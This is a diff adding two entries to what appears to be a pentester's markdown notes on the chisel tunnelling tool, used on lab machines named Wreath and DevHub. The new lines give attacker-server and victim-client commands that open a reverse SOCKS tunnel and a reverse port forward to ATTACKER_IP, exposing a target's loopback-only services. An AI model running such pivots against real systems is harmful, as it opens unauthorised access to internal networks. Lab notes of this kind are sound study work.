@@ -59,4 +59,26 @@ Used on: **Wreath** - the GitStack host could reach the intermediate server but 
 - [foxyproxy](foxyproxy.md)
 - [chisel-pivoting.md](../../techniques/pivot/chisel.md)
 
+## Additional Commands Used
+
+### Reverse SOCKS pivot with SOCKS5 enabled
+```bash
+# Attacker
+./chisel server -p 9001 --reverse --socks5
+
+# Victim
+./chisel client ATTACKER_IP:9001 R:socks &
+```
+Used on: **DevHub** - exposed loopback-only services through a reverse SOCKS tunnel.
+
+### Reverse port forward to JupyterLab
+```bash
+# Attacker
+./chisel server -p 9001 --reverse --socks5
+
+# Victim
+./chisel client ATTACKER_IP:9001 R:8889:127.0.0.1:8888 &
+```
+Used on: **DevHub** - forwarded JupyterLab from target loopback `127.0.0.1:8888` to attacker-side `localhost:8889`.
+
 
